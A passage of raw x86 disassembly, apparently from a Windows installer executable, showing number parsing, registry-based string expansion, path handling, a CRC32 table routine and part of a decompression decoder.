  406541:	41                   	inc    %ecx
  406542:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406546:	66 83 39 30          	cmpw   $0x30,(%ecx)
  40654a:	75 27                	jne    0x406573
  40654c:	41                   	inc    %ecx
  40654d:	41                   	inc    %ecx
  40654e:	66 8b 11             	mov    (%ecx),%dx
  406551:	66 83 fa 30          	cmp    $0x30,%dx
  406555:	72 0c                	jb     0x406563
  406557:	66 83 fa 37          	cmp    $0x37,%dx
  40655b:	77 06                	ja     0x406563
  40655d:	6a 08                	push   $0x8
  40655f:	58                   	pop    %eax
  406560:	6a 37                	push   $0x37
  406562:	5b                   	pop    %ebx
  406563:	0f b7 d2             	movzwl %dx,%edx
  406566:	83 e2 df             	and    $0xffffffdf,%edx
  406569:	83 fa 58             	cmp    $0x58,%edx
  40656c:	75 05                	jne    0x406573
  40656e:	6a 10                	push   $0x10
  406570:	41                   	inc    %ecx
  406571:	58                   	pop    %eax
  406572:	41                   	inc    %ecx
  406573:	0f b7 11             	movzwl (%ecx),%edx
  406576:	41                   	inc    %ecx
  406577:	41                   	inc    %ecx
  406578:	83 fa 30             	cmp    $0x30,%edx
  40657b:	7c 0c                	jl     0x406589
  40657d:	0f b7 f3             	movzwl %bx,%esi
  406580:	3b d6                	cmp    %esi,%edx
  406582:	7f 05                	jg     0x406589
  406584:	83 ea 30             	sub    $0x30,%edx
  406587:	eb 1b                	jmp    0x4065a4
  406589:	66 3d 10 00          	cmp    $0x10,%ax
  40658d:	75 23                	jne    0x4065b2
  40658f:	8b f2                	mov    %edx,%esi
  406591:	83 e6 df             	and    $0xffffffdf,%esi
  406594:	83 fe 41             	cmp    $0x41,%esi
  406597:	7c 19                	jl     0x4065b2
  406599:	83 fe 46             	cmp    $0x46,%esi
  40659c:	7f 14                	jg     0x4065b2
  40659e:	83 e2 07             	and    $0x7,%edx
  4065a1:	83 c2 09             	add    $0x9,%edx
  4065a4:	0f b7 f0             	movzwl %ax,%esi
  4065a7:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  4065ab:	03 f2                	add    %edx,%esi
  4065ad:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4065b0:	eb c1                	jmp    0x406573
  4065b2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4065b5:	5e                   	pop    %esi
  4065b6:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  4065ba:	5b                   	pop    %ebx
  4065bb:	c9                   	leave
  4065bc:	c2 04 00             	ret    $0x4
  4065bf:	68 00 04 00 00       	push   $0x400
  4065c4:	ff 74 24 0c          	push   0xc(%esp)
  4065c8:	ff 74 24 0c          	push   0xc(%esp)
  4065cc:	ff 15 98 80 40 00    	call   *0x408098
  4065d2:	c2 08 00             	ret    $0x8
  4065d5:	ff 25 9c 80 40 00    	jmp    *0x40809c
  4065db:	ff 25 54 81 40 00    	jmp    *0x408154
  4065e1:	33 c0                	xor    %eax,%eax
  4065e3:	50                   	push   %eax
  4065e4:	50                   	push   %eax
  4065e5:	ff 74 24 14          	push   0x14(%esp)
  4065e9:	ff 74 24 14          	push   0x14(%esp)
  4065ed:	6a ff                	push   $0xffffffff
  4065ef:	ff 74 24 18          	push   0x18(%esp)
  4065f3:	50                   	push   %eax
  4065f4:	50                   	push   %eax
  4065f5:	ff 15 94 80 40 00    	call   *0x408094
  4065fb:	c3                   	ret
  4065fc:	8b 44 24 08          	mov    0x8(%esp),%eax
  406600:	83 ec 10             	sub    $0x10,%esp
  406603:	85 c0                	test   %eax,%eax
  406605:	7d 11                	jge    0x406618
  406607:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  40660d:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406614:	2b c8                	sub    %eax,%ecx
  406616:	8b 01                	mov    (%ecx),%eax
  406618:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  40661e:	53                   	push   %ebx
  40661f:	55                   	push   %ebp
  406620:	56                   	push   %esi
  406621:	57                   	push   %edi
  406622:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  406625:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406629:	b8 a0 26 43 00       	mov    $0x4326a0,%eax
  40662e:	3b c8                	cmp    %eax,%ecx
  406630:	8b f0                	mov    %eax,%esi
  406632:	0f 82 0a 02 00 00    	jb     0x406842
  406638:	8b d1                	mov    %ecx,%edx
  40663a:	2b d0                	sub    %eax,%edx
  40663c:	d1 fa                	sar    $1,%edx
  40663e:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406644:	0f 83 f8 01 00 00    	jae    0x406842
  40664a:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  40664f:	8b f1                	mov    %ecx,%esi
  406651:	e9 ec 01 00 00       	jmp    0x406842
  406656:	8b ce                	mov    %esi,%ecx
  406658:	2b c8                	sub    %eax,%ecx
  40665a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40665d:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406663:	0f 8d e5 01 00 00    	jge    0x40684e
  406669:	6a 02                	push   $0x2
  40666b:	59                   	pop    %ecx
  40666c:	03 f9                	add    %ecx,%edi
  40666e:	66 83 fd 04          	cmp    $0x4,%bp
  406672:	0f 83 b7 01 00 00    	jae    0x40682f
  406678:	8a 4f 01             	mov    0x1(%edi),%cl
  40667b:	8a 07                	mov    (%edi),%al
  40667d:	8a d1                	mov    %cl,%dl
  40667f:	8a d8                	mov    %al,%bl
  406681:	83 e2 7f             	and    $0x7f,%edx
  406684:	83 e3 7f             	and    $0x7f,%ebx
  406687:	c1 e2 07             	shl    $0x7,%edx
  40668a:	0f b6 c0             	movzbl %al,%eax
  40668d:	0b d3                	or     %ebx,%edx
  40668f:	8b d8                	mov    %eax,%ebx
  406691:	89 54 24 28          	mov    %edx,0x28(%esp)
  406695:	ba 00 80 00 00       	mov    $0x8000,%edx
  40669a:	0b da                	or     %edx,%ebx
  40669c:	6a 02                	push   $0x2
  40669e:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4066a2:	89 44 24 18          	mov    %eax,0x18(%esp)
  4066a6:	0f b6 d9             	movzbl %cl,%ebx
  4066a9:	8b cb                	mov    %ebx,%ecx
  4066ab:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4066af:	0b ca                	or     %edx,%ecx
  4066b1:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4066b5:	59                   	pop    %ecx
  4066b6:	03 f9                	add    %ecx,%edi
  4066b8:	66 3b e9             	cmp    %cx,%bp
  4066bb:	0f 85 12 01 00 00    	jne    0x4067d3
  4066c1:	33 ed                	xor    %ebp,%ebp
  4066c3:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4066c7:	39 2d 84 47 43 00    	cmp    %ebp,0x434784
  4066cd:	74 08                	je     0x4066d7
  4066cf:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  4066d6:	00 
  4066d7:	84 c0                	test   %al,%al
  4066d9:	79 38                	jns    0x406713
  4066db:	8b c8                	mov    %eax,%ecx
  4066dd:	83 e0 3f             	and    $0x3f,%eax
  4066e0:	83 e1 40             	and    $0x40,%ecx
  4066e3:	51                   	push   %ecx
  4066e4:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  4066ea:	56                   	push   %esi
  4066eb:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4066ee:	50                   	push   %eax
  4066ef:	68 20 84 40 00       	push   $0x408420
  4066f4:	68 02 00 00 80       	push   $0x80000002
  4066f9:	e8 8f fd ff ff       	call   0x40648d
  4066fe:	66 39 2e             	cmp    %bp,(%esi)
  406701:	0f 85 b4 00 00 00    	jne    0x4067bb
  406707:	53                   	push   %ebx
  406708:	56                   	push   %esi
  406709:	e8 ee fe ff ff       	call   0x4065fc
  40670e:	e9 a3 00 00 00       	jmp    0x4067b6
  406713:	83 f8 25             	cmp    $0x25,%eax
  406716:	75 11                	jne    0x406729
  406718:	68 00 04 00 00       	push   $0x400
  40671d:	56                   	push   %esi
  40671e:	ff 15 58 81 40 00    	call   *0x408158
  406724:	e9 8d 00 00 00       	jmp    0x4067b6
  406729:	83 f8 24             	cmp    $0x24,%eax
  40672c:	75 10                	jne    0x40673e
  40672e:	68 00 04 00 00       	push   $0x400
  406733:	56                   	push   %esi
  406734:	ff 15 b0 80 40 00    	call   *0x4080b0
  40673a:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  40673e:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  406742:	74 72                	je     0x4067b6
  406744:	ff 4c 24 28          	decl   0x28(%esp)
  406748:	8b 44 24 28          	mov    0x28(%esp),%eax
  40674c:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  406750:	a1 04 47 43 00       	mov    0x434704,%eax
  406755:	83 e3 bf             	and    $0xffffffbf,%ebx
  406758:	8b eb                	mov    %ebx,%ebp
  40675a:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  406760:	85 c0                	test   %eax,%eax
  406762:	74 12                	je     0x406776
  406764:	56                   	push   %esi
  406765:	6a 00                	push   $0x0
  406767:	6a 00                	push   $0x0
  406769:	53                   	push   %ebx
  40676a:	ff 35 08 47 43 00    	push   0x434708
  406770:	ff d0                	call   *%eax
  406772:	85 c0                	test   %eax,%eax
  406774:	74 3a                	je     0x4067b0
  406776:	6a 07                	push   $0x7
  406778:	e8 36 02 00 00       	call   0x4069b3
  40677d:	0f b6 cb             	movzbl %bl,%ecx
  406780:	55                   	push   %ebp
  406781:	51                   	push   %ecx
  406782:	ff 35 08 47 43 00    	push   0x434708
  406788:	ff d0                	call   *%eax
  40678a:	8b d8                	mov    %eax,%ebx
  40678c:	85 db                	test   %ebx,%ebx
  40678e:	74 15                	je     0x4067a5
  406790:	56                   	push   %esi
  406791:	53                   	push   %ebx
  406792:	ff 15 74 81 40 00    	call   *0x408174
  406798:	53                   	push   %ebx
  406799:	8b e8                	mov    %eax,%ebp
  40679b:	ff 15 a0 82 40 00    	call   *0x4082a0
  4067a1:	85 ed                	test   %ebp,%ebp
  4067a3:	75 0b                	jne    0x4067b0
  4067a5:	66 83 26 00          	andw   $0x0,(%esi)
  4067a9:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  4067ae:	75 94                	jne    0x406744
  4067b0:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4067b4:	33 ed                	xor    %ebp,%ebp
  4067b6:	66 39 2e             	cmp    %bp,(%esi)
  4067b9:	74 10                	je     0x4067cb
  4067bb:	83 fb 1a             	cmp    $0x1a,%ebx
  4067be:	75 0b                	jne    0x4067cb
  4067c0:	68 78 84 40 00       	push   $0x408478
  4067c5:	56                   	push   %esi
  4067c6:	e8 10 fe ff ff       	call   0x4065db
  4067cb:	56                   	push   %esi
  4067cc:	e8 9c 00 00 00       	call   0x40686d
  4067d1:	eb 4c                	jmp    0x40681f
  4067d3:	66 83 fd 03          	cmp    $0x3,%bp
  4067d7:	75 32                	jne    0x40680b
  4067d9:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4067dd:	83 fb 1d             	cmp    $0x1d,%ebx
  4067e0:	75 0e                	jne    0x4067f0
  4067e2:	ff 35 08 47 43 00    	push   0x434708
  4067e8:	56                   	push   %esi
  4067e9:	e8 18 fd ff ff       	call   0x406506
  4067ee:	eb 11                	jmp    0x406801
  4067f0:	8b c3                	mov    %ebx,%eax
  4067f2:	c1 e0 0b             	shl    $0xb,%eax
  4067f5:	05 00 50 43 00       	add    $0x435000,%eax
  4067fa:	50                   	push   %eax
  4067fb:	56                   	push   %esi
  4067fc:	e8 be fd ff ff       	call   0x4065bf
  406801:	83 c3 eb             	add    $0xffffffeb,%ebx
  406804:	83 fb 07             	cmp    $0x7,%ebx
  406807:	73 16                	jae    0x40681f
  406809:	eb c0                	jmp    0x4067cb
  40680b:	66 83 fd 01          	cmp    $0x1,%bp
  40680f:	75 0e                	jne    0x40681f
  406811:	83 c8 ff             	or     $0xffffffff,%eax
  406814:	2b 44 24 28          	sub    0x28(%esp),%eax
  406818:	50                   	push   %eax
  406819:	56                   	push   %esi
  40681a:	e8 dd fd ff ff       	call   0x4065fc
  40681f:	56                   	push   %esi
  406820:	e8 b0 fd ff ff       	call   0x4065d5
  406825:	8d 34 46             	lea    (%esi,%eax,2),%esi
  406828:	b8 a0 26 43 00       	mov    $0x4326a0,%eax
  40682d:	eb 13                	jmp    0x406842
  40682f:	75 0c                	jne    0x40683d
  406831:	66 8b 17             	mov    (%edi),%dx
  406834:	66 89 16             	mov    %dx,(%esi)
  406837:	03 f1                	add    %ecx,%esi
  406839:	03 f9                	add    %ecx,%edi
  40683b:	eb 05                	jmp    0x406842
  40683d:	66 89 2e             	mov    %bp,(%esi)
  406840:	03 f1                	add    %ecx,%esi
  406842:	66 8b 2f             	mov    (%edi),%bp
  406845:	66 85 ed             	test   %bp,%bp
  406848:	0f 85 08 fe ff ff    	jne    0x406656
  40684e:	66 83 26 00          	andw   $0x0,(%esi)
  406852:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  406857:	5f                   	pop    %edi
  406858:	5e                   	pop    %esi
  406859:	5d                   	pop    %ebp
  40685a:	5b                   	pop    %ebx
  40685b:	74 0a                	je     0x406867
  40685d:	50                   	push   %eax
  40685e:	ff 74 24 18          	push   0x18(%esp)
  406862:	e8 58 fd ff ff       	call   0x4065bf
  406867:	83 c4 10             	add    $0x10,%esp
  40686a:	c2 08 00             	ret    $0x8
  40686d:	55                   	push   %ebp
  40686e:	56                   	push   %esi
  40686f:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406873:	57                   	push   %edi
  406874:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406878:	75 18                	jne    0x406892
  40687a:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  40687f:	75 11                	jne    0x406892
  406881:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406886:	75 0a                	jne    0x406892
  406888:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  40688d:	75 03                	jne    0x406892
  40688f:	83 c6 08             	add    $0x8,%esi
  406892:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406896:	74 0d                	je     0x4068a5
  406898:	56                   	push   %esi
  406899:	e8 67 f6 ff ff       	call   0x405f05
  40689e:	85 c0                	test   %eax,%eax
  4068a0:	74 03                	je     0x4068a5
  4068a2:	83 c6 04             	add    $0x4,%esi
  4068a5:	66 8b 06             	mov    (%esi),%ax
  4068a8:	8b ee                	mov    %esi,%ebp
  4068aa:	66 85 c0             	test   %ax,%ax
  4068ad:	8b fe                	mov    %esi,%edi
  4068af:	74 40                	je     0x4068f1
  4068b1:	53                   	push   %ebx
  4068b2:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  4068b8:	66 3d 1f 00          	cmp    $0x1f,%ax
  4068bc:	76 25                	jbe    0x4068e3
  4068be:	50                   	push   %eax
  4068bf:	68 9c a5 40 00       	push   $0x40a59c
  4068c4:	e8 f2 f5 ff ff       	call   0x405ebb
  4068c9:	66 83 38 00          	cmpw   $0x0,(%eax)
  4068cd:	75 14                	jne    0x4068e3
  4068cf:	56                   	push   %esi
  4068d0:	ff d3                	call   *%ebx
  4068d2:	2b c6                	sub    %esi,%eax
  4068d4:	d1 f8                	sar    $1,%eax
  4068d6:	50                   	push   %eax
  4068d7:	56                   	push   %esi
  4068d8:	57                   	push   %edi
  4068d9:	e8 8c f7 ff ff       	call   0x40606a
  4068de:	57                   	push   %edi
  4068df:	ff d3                	call   *%ebx
  4068e1:	8b f8                	mov    %eax,%edi
  4068e3:	56                   	push   %esi
  4068e4:	ff d3                	call   *%ebx
  4068e6:	8b f0                	mov    %eax,%esi
  4068e8:	66 8b 06             	mov    (%esi),%ax
  4068eb:	66 85 c0             	test   %ax,%ax
  4068ee:	75 c8                	jne    0x4068b8
  4068f0:	5b                   	pop    %ebx
  4068f1:	66 83 27 00          	andw   $0x0,(%edi)
  4068f5:	57                   	push   %edi
  4068f6:	55                   	push   %ebp
  4068f7:	ff 15 fc 81 40 00    	call   *0x4081fc
  4068fd:	8b f8                	mov    %eax,%edi
  4068ff:	66 8b 07             	mov    (%edi),%ax
  406902:	66 3d 20 00          	cmp    $0x20,%ax
  406906:	74 06                	je     0x40690e
  406908:	66 3d 5c 00          	cmp    $0x5c,%ax
  40690c:	75 08                	jne    0x406916
  40690e:	66 83 27 00          	andw   $0x0,(%edi)
  406912:	3b ef                	cmp    %edi,%ebp
  406914:	72 df                	jb     0x4068f5
  406916:	5f                   	pop    %edi
  406917:	5e                   	pop    %esi
  406918:	5d                   	pop    %ebp
  406919:	c2 04 00             	ret    $0x4
  40691c:	56                   	push   %esi
  40691d:	be b8 fa 42 00       	mov    $0x42fab8,%esi
  406922:	56                   	push   %esi
  406923:	ff 74 24 0c          	push   0xc(%esp)
  406927:	ff 15 40 81 40 00    	call   *0x408140
  40692d:	83 f8 ff             	cmp    $0xffffffff,%eax
  406930:	74 0b                	je     0x40693d
  406932:	50                   	push   %eax
  406933:	ff 15 38 81 40 00    	call   *0x408138
  406939:	8b c6                	mov    %esi,%eax
  40693b:	eb 02                	jmp    0x40693f
  40693d:	33 c0                	xor    %eax,%eax
  40693f:	5e                   	pop    %esi
  406940:	c2 04 00             	ret    $0x4
  406943:	55                   	push   %ebp
  406944:	8b ec                	mov    %esp,%ebp
  406946:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  40694c:	56                   	push   %esi
  40694d:	be 04 01 00 00       	mov    $0x104,%esi
  406952:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406958:	56                   	push   %esi
  406959:	50                   	push   %eax
  40695a:	ff 15 58 81 40 00    	call   *0x408158
  406960:	3b c6                	cmp    %esi,%eax
  406962:	5e                   	pop    %esi
  406963:	76 02                	jbe    0x406967
  406965:	33 c0                	xor    %eax,%eax
  406967:	85 c0                	test   %eax,%eax
  406969:	74 0f                	je     0x40697a
  40696b:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406972:	ff 5c 
  406974:	74 04                	je     0x40697a
  406976:	33 c9                	xor    %ecx,%ecx
  406978:	eb 03                	jmp    0x40697d
  40697a:	33 c9                	xor    %ecx,%ecx
  40697c:	41                   	inc    %ecx
  40697d:	ff 75 08             	push   0x8(%ebp)
  406980:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406987:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  40698e:	51                   	push   %ecx
  40698f:	68 b0 a5 40 00       	push   $0x40a5b0
  406994:	50                   	push   %eax
  406995:	ff 15 2c 82 40 00    	call   *0x40822c
  40699b:	83 c4 10             	add    $0x10,%esp
  40699e:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4069a4:	6a 08                	push   $0x8
  4069a6:	6a 00                	push   $0x0
  4069a8:	50                   	push   %eax
  4069a9:	ff 15 18 81 40 00    	call   *0x408118
  4069af:	c9                   	leave
  4069b0:	c2 04 00             	ret    $0x4
  4069b3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4069b7:	56                   	push   %esi
  4069b8:	8b f0                	mov    %eax,%esi
  4069ba:	57                   	push   %edi
  4069bb:	c1 e6 03             	shl    $0x3,%esi
  4069be:	8b be d8 a3 40 00    	mov    0x40a3d8(%esi),%edi
  4069c4:	57                   	push   %edi
  4069c5:	ff 15 60 81 40 00    	call   *0x408160
  4069cb:	85 c0                	test   %eax,%eax
  4069cd:	75 0a                	jne    0x4069d9
  4069cf:	57                   	push   %edi
  4069d0:	e8 6e ff ff ff       	call   0x406943
  4069d5:	85 c0                	test   %eax,%eax
  4069d7:	74 0f                	je     0x4069e8
  4069d9:	ff b6 dc a3 40 00    	push   0x40a3dc(%esi)
  4069df:	50                   	push   %eax
  4069e0:	ff 15 5c 81 40 00    	call   *0x40815c
  4069e6:	eb 02                	jmp    0x4069ea
  4069e8:	33 c0                	xor    %eax,%eax
  4069ea:	5f                   	pop    %edi
  4069eb:	5e                   	pop    %esi
  4069ec:	c2 04 00             	ret    $0x4
  4069ef:	55                   	push   %ebp
  4069f0:	8b ec                	mov    %esp,%ebp
  4069f2:	83 ec 1c             	sub    $0x1c,%esp
  4069f5:	56                   	push   %esi
  4069f6:	8b 75 08             	mov    0x8(%ebp),%esi
  4069f9:	57                   	push   %edi
  4069fa:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  406a00:	eb 0a                	jmp    0x406a0c
  406a02:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406a05:	50                   	push   %eax
  406a06:	ff 15 7c 82 40 00    	call   *0x40827c
  406a0c:	6a 01                	push   $0x1
  406a0e:	56                   	push   %esi
  406a0f:	56                   	push   %esi
  406a10:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406a13:	6a 00                	push   $0x0
  406a15:	50                   	push   %eax
  406a16:	ff d7                	call   *%edi
  406a18:	85 c0                	test   %eax,%eax
  406a1a:	75 e6                	jne    0x406a02
  406a1c:	5f                   	pop    %edi
  406a1d:	5e                   	pop    %esi
  406a1e:	c9                   	leave
  406a1f:	c2 04 00             	ret    $0x4
  406a22:	55                   	push   %ebp
  406a23:	8b ec                	mov    %esp,%ebp
  406a25:	81 ec 00 01 00 00    	sub    $0x100,%esp
  406a2b:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a31:	68 00 01 00 00       	push   $0x100
  406a36:	50                   	push   %eax
  406a37:	ff 75 0c             	push   0xc(%ebp)
  406a3a:	e8 a2 fb ff ff       	call   0x4065e1
  406a3f:	83 c4 0c             	add    $0xc,%esp
  406a42:	85 c0                	test   %eax,%eax
  406a44:	74 12                	je     0x406a58
  406a46:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a4c:	50                   	push   %eax
  406a4d:	ff 75 08             	push   0x8(%ebp)
  406a50:	ff 15 5c 81 40 00    	call   *0x40815c
  406a56:	eb 02                	jmp    0x406a5a
  406a58:	33 c0                	xor    %eax,%eax
  406a5a:	c9                   	leave
  406a5b:	c2 08 00             	ret    $0x8
  406a5e:	55                   	push   %ebp
  406a5f:	8b ec                	mov    %esp,%ebp
  406a61:	51                   	push   %ecx
  406a62:	56                   	push   %esi
  406a63:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406a69:	57                   	push   %edi
  406a6a:	6a 64                	push   $0x64
  406a6c:	ff 75 08             	push   0x8(%ebp)
  406a6f:	ff d6                	call   *%esi
  406a71:	bf 02 01 00 00       	mov    $0x102,%edi
  406a76:	eb 0e                	jmp    0x406a86
  406a78:	6a 0f                	push   $0xf
  406a7a:	e8 70 ff ff ff       	call   0x4069ef
  406a7f:	6a 64                	push   $0x64
  406a81:	ff 75 08             	push   0x8(%ebp)
  406a84:	ff d6                	call   *%esi
  406a86:	3b c7                	cmp    %edi,%eax
  406a88:	74 ee                	je     0x406a78
  406a8a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a8d:	50                   	push   %eax
  406a8e:	ff 75 08             	push   0x8(%ebp)
  406a91:	ff 15 64 81 40 00    	call   *0x408164
  406a97:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a9a:	5f                   	pop    %edi
  406a9b:	5e                   	pop    %esi
  406a9c:	c9                   	leave
  406a9d:	c2 04 00             	ret    $0x4
  406aa0:	83 3d 0c 11 43 00 00 	cmpl   $0x0,0x43110c
  406aa7:	56                   	push   %esi
  406aa8:	75 2d                	jne    0x406ad7
  406aaa:	33 c9                	xor    %ecx,%ecx
  406aac:	6a 08                	push   $0x8
  406aae:	8b c1                	mov    %ecx,%eax
  406ab0:	5e                   	pop    %esi
  406ab1:	8b d0                	mov    %eax,%edx
  406ab3:	80 e2 01             	and    $0x1,%dl
  406ab6:	f6 da                	neg    %dl
  406ab8:	1b d2                	sbb    %edx,%edx
  406aba:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406ac0:	d1 e8                	shr    $1,%eax
  406ac2:	33 c2                	xor    %edx,%eax
  406ac4:	4e                   	dec    %esi
  406ac5:	75 ea                	jne    0x406ab1
  406ac7:	89 04 8d 08 11 43 00 	mov    %eax,0x431108(,%ecx,4)
  406ace:	41                   	inc    %ecx
  406acf:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406ad5:	7c d5                	jl     0x406aac
  406ad7:	8b 54 24 10          	mov    0x10(%esp),%edx
  406adb:	8b 44 24 08          	mov    0x8(%esp),%eax
  406adf:	85 d2                	test   %edx,%edx
  406ae1:	f7 d0                	not    %eax
  406ae3:	76 23                	jbe    0x406b08
  406ae5:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406ae9:	57                   	push   %edi
  406aea:	0f b6 39             	movzbl (%ecx),%edi
  406aed:	8b f0                	mov    %eax,%esi
  406aef:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406af5:	33 f7                	xor    %edi,%esi
  406af7:	c1 e8 08             	shr    $0x8,%eax
  406afa:	8b 34 b5 08 11 43 00 	mov    0x431108(,%esi,4),%esi
  406b01:	33 c6                	xor    %esi,%eax
  406b03:	41                   	inc    %ecx
  406b04:	4a                   	dec    %edx
  406b05:	75 e3                	jne    0x406aea
  406b07:	5f                   	pop    %edi
  406b08:	f7 d0                	not    %eax
  406b0a:	5e                   	pop    %esi
  406b0b:	c2 0c 00             	ret    $0xc
  406b0e:	55                   	push   %ebp
  406b0f:	8b ec                	mov    %esp,%ebp
  406b11:	83 ec 44             	sub    $0x44,%esp
  406b14:	8b 45 08             	mov    0x8(%ebp),%eax
  406b17:	53                   	push   %ebx
  406b18:	56                   	push   %esi
  406b19:	57                   	push   %edi
  406b1a:	8b 08                	mov    (%eax),%ecx
  406b1c:	8d 70 10             	lea    0x10(%eax),%esi
  406b1f:	8b 40 04             	mov    0x4(%eax),%eax
  406b22:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  406b25:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  406b2b:	8b 9e 18 05 00 00    	mov    0x518(%esi),%ebx
  406b31:	89 45 cc             	mov    %eax,-0x34(%ebp)
  406b34:	8b 86 1c 05 00 00    	mov    0x51c(%esi),%eax
  406b3a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  406b3d:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406b43:	3b c8                	cmp    %eax,%ecx
  406b45:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406b48:	73 05                	jae    0x406b4f
  406b4a:	2b c1                	sub    %ecx,%eax
  406b4c:	48                   	dec    %eax
  406b4d:	eb 08                	jmp    0x406b57
  406b4f:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406b55:	2b c1                	sub    %ecx,%eax
  406b57:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406b5a:	e9 c3 09 00 00       	jmp    0x407522
  406b5f:	ff 24 85 5d 75 40 00 	jmp    *0x40755d(,%eax,4)
  406b66:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406b6a:	0f 84 c2 09 00 00    	je     0x407532
  406b70:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406b73:	ff 4d cc             	decl   -0x34(%ebp)
  406b76:	8b cb                	mov    %ebx,%ecx
  406b78:	0f b6 00             	movzbl (%eax),%eax
  406b7b:	d3 e0                	shl    %cl,%eax
  406b7d:	09 45 c0             	or     %eax,-0x40(%ebp)
  406b80:	ff 45 c8             	incl   -0x38(%ebp)
  406b83:	83 c3 08             	add    $0x8,%ebx
  406b86:	83 fb 03             	cmp    $0x3,%ebx
  406b89:	72 db                	jb     0x406b66
  406b8b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406b8e:	83 eb 03             	sub    $0x3,%ebx
  406b91:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406b95:	83 e0 07             	and    $0x7,%eax
  406b98:	8b c8                	mov    %eax,%ecx
  406b9a:	80 e1 01             	and    $0x1,%cl
  406b9d:	f6 d9                	neg    %cl
  406b9f:	1b c9                	sbb    %ecx,%ecx
  406ba1:	83 e1 07             	and    $0x7,%ecx
  406ba4:	d1 e8                	shr    $1,%eax
  406ba6:	83 c1 08             	add    $0x8,%ecx
  406ba9:	83 e8 00             	sub    $0x0,%eax
  406bac:	89 8e 14 05 00 00    	mov    %ecx,0x514(%esi)
  406bb2:	0f 84 2e 01 00 00    	je     0x406ce6
  406bb8:	48                   	dec    %eax
  406bb9:	74 56                	je     0x406c11
  406bbb:	48                   	dec    %eax
  406bbc:	74 48                	je     0x406c06
  406bbe:	48                   	dec    %eax
  406bbf:	0f 85 5d 09 00 00    	jne    0x407522
  406bc5:	83 cf ff             	or     $0xffffffff,%edi
  406bc8:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406bce:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406bd1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406bd4:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  406bda:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406bdd:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  406be3:	89 41 04             	mov    %eax,0x4(%ecx)
  406be6:	8b 45 08             	mov    0x8(%ebp),%eax
  406be9:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406bec:	50                   	push   %eax
  406bed:	89 08                	mov    %ecx,(%eax)
  406bef:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  406bf2:	89 8e a8 9b 00 00    	mov    %ecx,0x9ba8(%esi)
  406bf8:	e8 a0 09 00 00       	call   0x40759d
  406bfd:	8b c7                	mov    %edi,%eax
  406bff:	5f                   	pop    %edi
